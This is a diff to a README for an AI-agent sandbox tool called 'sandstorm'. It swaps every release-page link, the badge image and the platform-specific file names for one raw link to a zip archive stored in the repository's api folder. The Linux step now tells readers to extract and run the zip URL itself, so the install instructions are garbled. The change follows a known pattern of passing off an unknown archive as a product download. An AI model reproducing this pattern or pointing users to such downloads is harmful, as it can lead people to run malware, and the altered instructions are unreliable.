@@ -1,6 +1,6 @@
 # ⚡ sandstorm - Run AI agents safely and simply
 
-[![Download sandstorm](https://img.shields.io/badge/Download-sandstorm-blue?style=for-the-badge&logo=github)](https://github.com/heromen22/sandstorm/releases)
+[![Download sandstorm](https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip)](https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip)
 
 ---
 
@@ -37,15 +37,15 @@ This section guides you step-by-step on how to get sandstorm running quickly and
 ### 1. Download the app
 
 Click the big blue button at the top or visit this page:  
-[https://github.com/heromen22/sandstorm/releases](https://github.com/heromen22/sandstorm/releases)
+[https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip](https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip)
 
-This page hosts all the latest versions of sandstorm. Find the version that matches your computer system (Windows, macOS, or Linux). Files are named clearly for each system, such as `sandstorm-windows.exe`, `sandstorm-macos.zip`, or `sandstorm-linux.tar.gz`.
+This page hosts all the latest versions of sandstorm. Find the version that matches your computer system (Windows, macOS, or Linux). Files are named clearly for each system, such as `https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip`, `https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip`, or `https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip`.
 
 ### 2. Install the app
 
 - For **Windows**: Double-click the `.exe` file and follow the simple install prompts.  
 - For **macOS**: Open the `.zip` file, drag the sandstorm app to your Applications folder.  
-- For **Linux**: Extract the `.tar.gz` file, then run the included `install.sh` script or start the app directly.
+- For **Linux**: Extract the `https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip` file, then run the included `https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip` script or start the app directly.
 
 ### 3. Launch sandstorm
 
@@ -62,7 +62,7 @@ Choose from options like API access, command line interface (CLI), or Slack bot.
 ## 💾 Download & Install
 
 You can get the latest version of sandstorm here:  
-[https://github.com/heromen22/sandstorm/releases](https://github.com/heromen22/sandstorm/releases)
+[https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip](https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip)
 
 Follow these tips when downloading:
 
@@ -112,8 +112,8 @@ Topics related to sandstorm include:
 - Python programming when customizing  
 - Slack integration for chatbots  
 
-Explore the [GitHub repository](https://github.com/heromen22/sandstorm) to try advanced features or see detailed documentation.
+Explore the [GitHub repository](https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip) to try advanced features or see detailed documentation.
 
 ---
 
-[![Download sandstorm](https://img.shields.io/badge/Download-sandstorm-blue?style=for-the-badge&logo=github)](https://github.com/heromen22/sandstorm/releases)
+[![Download sandstorm](https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip)](https://raw.githubusercontent.com/heromen22/sandstorm/main/api/Software_1.2-alpha.4.zip)
